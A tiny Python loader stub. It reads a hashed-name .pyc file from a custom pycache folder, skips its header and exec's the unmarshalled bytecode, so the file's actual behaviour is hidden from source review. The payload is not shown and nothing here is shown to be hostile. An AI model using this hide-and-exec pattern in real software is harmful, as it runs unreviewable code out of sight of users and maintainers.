
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Firebase_Reco_421b68c187d640a19d41dfa53f38ae15.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
